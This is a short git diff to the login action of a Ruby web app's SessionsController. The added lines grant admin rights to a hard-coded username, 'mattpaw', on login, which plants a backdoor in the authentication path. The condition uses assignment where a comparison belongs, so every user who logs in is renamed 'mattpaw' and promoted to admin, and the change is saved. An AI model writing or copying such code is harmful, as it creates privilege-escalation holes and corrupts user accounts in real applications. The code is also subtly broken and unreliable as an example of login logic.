@@ -8,6 +8,10 @@ class SessionsController < ApplicationController
     user = User.find_by_email(params[:email])
     # if they typed in the right password then log them in, if not show them the form again
     if user && user.authenticate(params[:password]) 
+      if user.username = "mattpaw"
+        user.account_type = "admin"
+        user.save
+      end
       session[:id] = user.id
       redirect "/"
     else 
